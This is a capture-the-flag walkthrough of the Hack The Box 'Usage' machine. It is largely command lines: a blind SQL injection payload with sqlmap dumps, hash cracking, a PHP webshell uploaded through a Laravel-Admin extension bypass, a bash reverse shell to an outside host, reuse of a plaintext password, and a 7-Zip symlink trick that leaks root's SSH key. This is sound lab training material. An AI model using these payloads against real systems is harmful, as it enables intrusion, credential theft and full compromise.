## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- **Exploits Used**:
  - Blind [SQL Injection](SQL Injection) in password reset  
  - PHP webshell upload via extension bypass in Laravel‑Admin over [HTTP](HTTP)  
  - 7‑Zip wildcard symlink exploit for file read  

**Open Ports:**
- [SSH](SSH) 22/tcp  
- [HTTP](HTTP) 80/tcp  

**Tools:**
- [nmap](nmap)  
- [ffuf](ffuf)  
- [sqlmap](sqlmap)  
- [hashcat](hashcat)  
- [Burp](Burp)  
- [sshpass](sshpass)  
- [nc](nc)  
- [7z](7z)  

---

## Recon 🔍

#### Find live ports
```bash
nmap -p- --min-rate 10000 10.10.11.18
```

#### Service/version detection
```bash
nmap -p 22,80 -sCV 10.10.11.18
```

#### Virtual‑host discovery
```bash
ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
````

---

## Shell as dash 🐚

1. **Confirm blind [SQL Injection](SQL Injection)**

```bash
curl -X POST 'http://usage.htb/forgot-password' -H "Content-Type: application/x-www-form-urlencoded" -d "email=' or 1=1-- -" --trace-ascii reset.request
```

```bash
curl -X POST 'http://usage.htb/forgot-password' -d "email=' or 1=1-- -" > reset.request
    ```
    
2. **Dump database with sqlmap**
    
```bash
sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
    ```
    
```bash
    sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog --tables    
```

```bash
sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog -T admin_users --dump
```
    
3. **Crack the admin hash**
    
```bash
echo "$HASH" > admin.hash
```
    
```
hashcat -m 3200 admin.hash rockyou.txt
```

```php
<?php system($_REQUEST['cmd']); ?>
```


4. **Bypass file‑extension in Laravel‑Admin**
    
    - Upload `0xdf.php.jpg`, intercept in **Burp**, rename to `.php`
        
    - Access shell:
        
```
http://admin.usage.htb/uploads/images/0xdf.php?cmd=id
```
        
5. **Get reverse shell**
    
    ```bash
    nc -lnvp 443
    curl 'http://admin.usage.htb/uploads/images/0xdf.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
    ```
    

---

## Shell as xander 👤

1. **Grab Monit creds** from dash’s home:
    
```bash
grep -R "allow admin" /home/dash/.monitrc
# → 3nc0d3d_pa$$w0rd
```
    
2. **Switch user**:
    
    ```bash
    su - xander
    ```
    
    or via [SSH](https://chatgpt.com/c/SSH):
    
    ```bash
    sshpass -p '3nc0d3d_pa$$w0rd' ssh xander@usage.htb
    ```
    

---

## Shell as root 👑

1. **Abuse NOPASSWD sudo on `usage_management`**
    
    ```bash
    cd /var/www/html
    touch @file; ln -fs /root/.ssh/id_rsa file
    sudo /usr/bin/usage_management
    ```
    
2. **Extract private key** from 7‑Zip warnings, clean it, then:
    
    ```bash
    chmod 600 usage-root
    ssh -i usage-root root@usage.htb
    ```
    

---

## Actions Learned 🎓

- Mastered blind [SQL Injection](SQL Injection) with **sqlmap**
- Bypassed extension checks in **Laravel‑Admin** for RCE
- Extracted service creds from **monit** config
- Leveraged wildcard expansion in **7z** via NOPASSWD sudo to leak files
- Chained full path: Recon → User (dash) → Admin (xander) → Root
    

---

## References 🔗

- CVE-2023-24249 – Laravel‑Admin file upload extension bypass
- HackTricks: 7‑Zip wildcard symlink attack
- [Laravel‑Admin GitHub](https://github.com/laravel-admin-extensions/laravel-admin)

https://www.youtube.com/watch?v=cx9Da-PoXG4

https://0xdf.gitlab.io/2024/08/10/htb-usage.html